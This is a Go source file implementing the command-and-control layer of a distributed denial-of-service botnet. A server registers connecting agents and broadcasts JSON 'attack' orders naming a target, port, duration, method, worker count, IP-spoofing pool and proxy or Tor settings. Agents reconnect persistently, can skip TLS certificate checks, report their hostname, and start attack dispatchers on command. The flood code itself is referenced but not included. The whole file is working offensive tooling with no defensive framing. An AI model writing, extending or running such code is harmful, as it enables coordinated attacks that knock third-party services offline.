package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type C2Command struct {
	Action     string `json:"action"`
	Target     string `json:"target"`
	Port       int    `json:"port"`
	Duration   int    `json:"duration"`
	Method     string `json:"method"`
	Workers    int    `json:"workers"`
	MixRatio   string `json:"mix_ratio"`
	SpoofPool  int    `json:"spoof_pool"`
	ProxyList  string `json:"proxy_list"`
	TorProxy   string `json:"tor_proxy"`
	Size       int    `json:"size"`
	AttackID   string `json:"attack_id"`
}

type C2Response struct {
	AgentID  string `json:"agent_id"`
	Status   string `json:"status"`
	Message  string `json:"message"`
	Sent     int64  `json:"sent"`
	Errors   int64  `json:"errors"`
	Workers  int    `json:"workers"`
	Uptime   int    `json:"uptime"`
}

type C2Server struct {
	addr     string
	useTLS   bool
	certFile string
	keyFile  string
	agents   sync.Map
	done     chan struct{}
	sessions int64
}

type agentConn struct {
	id       string
	conn     net.Conn
	lastSeen time.Time
	mu       sync.Mutex
}

func NewC2Server(addr string, useTLS bool, certFile, keyFile string) *C2Server {
	return &C2Server{
		addr:     addr,
		useTLS:   useTLS,
		certFile: certFile,
		keyFile:  keyFile,
		done:     make(chan struct{}),
	}
}

func (cs *C2Server) Start() error {
	var listener net.Listener
	var err error

	if cs.useTLS {
		cert, err := tls.LoadX509KeyPair(cs.certFile, cs.keyFile)
		if err != nil {
			return fmt.Errorf("load cert: %v", err)
		}
		config := &tls.Config{Certificates: []tls.Certificate{cert}}
		listener, err = tls.Listen("tcp", cs.addr, config)
	} else {
		listener, err = net.Listen("tcp", cs.addr)
	}
	if err != nil {
		return fmt.Errorf("listen: %v", err)
	}

	go func() {
		<-cs.done
		listener.Close()
	}()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				select {
				case <-cs.done:
					return
				default:
					continue
				}
			}
			atomic.AddInt64(&cs.sessions, 1)
			go cs.handleAgent(conn)
		}
	}()

	return nil
}

func (cs *C2Server) Stop() {
	close(cs.done)
	cs.agents.Range(func(key, value interface{}) bool {
		ac := value.(*agentConn)
		ac.mu.Lock()
		ac.conn.Close()
		ac.mu.Unlock()
		return true
	})
}

func (cs *C2Server) handleAgent(conn net.Conn) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 65536), 65536)

	agentID := fmt.Sprintf("agent-%d", atomic.LoadInt64(&cs.sessions))
	ac := &agentConn{id: agentID, conn: conn, lastSeen: time.Now()}
	cs.agents.Store(agentID, ac)
	defer cs.agents.Delete(agentID)

	warnf(`{"type":"c2","event":"agent_connected","id":"%s","remote":"%s"}`+"\n", agentID, conn.RemoteAddr())

	for scanner.Scan() {
		select {
		case <-cs.done:
			return
		default:
		}
		line := scanner.Text()
		var cmd C2Command
		if err := json.Unmarshal([]byte(line), &cmd); err != nil {
			continue
		}
		ac.lastSeen = time.Now()

		resp := cs.executeCommand(cmd)
		resp.AgentID = agentID
		data, _ := json.Marshal(resp)
		ac.mu.Lock()
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		fmt.Fprintf(conn, "%s\n", data)
		ac.mu.Unlock()
	}
}

func (cs *C2Server) executeCommand(cmd C2Command) C2Response {
	switch cmd.Action {
	case "ping":
		return C2Response{Status: "ok", Message: "pong"}
	case "attack":
		cfg := &AttackConfig{
			Target:    cmd.Target,
			Port:      cmd.Port,
			Duration:  cmd.Duration,
			Method:    cmd.Method,
			Workers:   cmd.Workers,
			MixRatio:  cmd.MixRatio,
			Size:      cmd.Size,
		}
		if cfg.Workers < 64 { cfg.Workers = 512 }
		if cfg.Workers > 4096 { cfg.Workers = 4096 }
		if cfg.Duration < 10 { cfg.Duration = 60 }

		done := make(chan struct{})
		status := make(chan WorkerStats, 1000)
		disp := NewDispatcher(cfg, status)
		go disp.Run(done)

		<-done
		return C2Response{Status: "completed", Message: fmt.Sprintf("attack %s finished", cmd.AttackID)}
	case "stop":
		return C2Response{Status: "ok", Message: "stop received"}
	default:
		return C2Response{Status: "error", Message: fmt.Sprintf("unknown action: %s", cmd.Action)}
	}
}

func (cs *C2Server) BroadcastCommand(cmd C2Command) {
	data, _ := json.Marshal(cmd)
	cs.agents.Range(func(key, value interface{}) bool {
		ac := value.(*agentConn)
		ac.mu.Lock()
		ac.conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		fmt.Fprintf(ac.conn, "%s\n", data)
		ac.mu.Unlock()
		return true
	})
}

func (cs *C2Server) AgentCount() int {
	count := 0
	cs.agents.Range(func(_, _ interface{}) bool {
		count++
		return true
	})
	return count
}

/* ─── C2 Agent ─── */

type C2Agent struct {
	serverAddr string
	useTLS     bool
	insecure   bool
	agentID    string
	done       chan struct{}
	cfg        *AttackConfig
}

func NewC2Agent(serverAddr string, useTLS, insecure bool) *C2Agent {
	return &C2Agent{
		serverAddr: serverAddr,
		useTLS:     useTLS,
		insecure:   insecure,
		done:       make(chan struct{}),
	}
}

func (ca *C2Agent) Run() {
	for {
		select {
		case <-ca.done:
			return
		default:
		}
		ca.connectAndListen()
		time.Sleep(5 * time.Second)
	}
}

func (ca *C2Agent) Stop() {
	close(ca.done)
}

func (ca *C2Agent) connectAndListen() {
	var conn net.Conn
	var err error

	if ca.useTLS {
		config := &tls.Config{InsecureSkipVerify: ca.insecure}
		conn, err = tls.Dial("tcp", ca.serverAddr, config)
	} else {
		conn, err = net.DialTimeout("tcp", ca.serverAddr, 10*time.Second)
	}
	if err != nil {
		errf(`{"type":"c2_agent","event":"connect_failed","error":"%v"}`+"\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	hello := C2Response{AgentID: hostname, Status: "hello", Message: fmt.Sprintf("agent on %s", hostname)}
	data, _ := json.Marshal(hello)
	fmt.Fprintf(conn, "%s\n", data)

	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 65536), 65536)
	for scanner.Scan() {
		select {
		case <-ca.done:
			return
		default:
		}
		line := scanner.Text()
		var cmd C2Command
		if err := json.Unmarshal([]byte(line), &cmd); err != nil {
			continue
		}
		ca.handleCommand(conn, cmd)
	}
}

func (ca *C2Agent) handleCommand(conn net.Conn, cmd C2Command) {
	switch cmd.Action {
	case "ping":
		resp := C2Response{Status: "ok", Message: "pong"}
		data, _ := json.Marshal(resp)
		fmt.Fprintf(conn, "%s\n", data)
	case "attack":
		go func() {
			cfg := &AttackConfig{
				Target:   cmd.Target,
				Port:     cmd.Port,
				Duration: cmd.Duration,
				Method:   cmd.Method,
				Workers:  cmd.Workers,
				MixRatio: cmd.MixRatio,
				Size:     cmd.Size,
			}
			if cfg.Workers < 64 { cfg.Workers = 512 }
			if cfg.Workers > 4096 { cfg.Workers = 4096 }
			if cfg.Duration < 10 { cfg.Duration = 60 }

			done := make(chan struct{})
			status := make(chan WorkerStats, 1000)
			disp := NewDispatcher(cfg, status)
			go disp.Run(done)

			<-done
		}()
		resp := C2Response{Status: "ok", Message: fmt.Sprintf("attack %s launched", cmd.AttackID)}
		data, _ := json.Marshal(resp)
		fmt.Fprintf(conn, "%s\n", data)
	default:
		resp := C2Response{Status: "error", Message: fmt.Sprintf("unknown action: %s", cmd.Action)}
		data, _ := json.Marshal(resp)
		fmt.Fprintf(conn, "%s\n", data)
	}
}
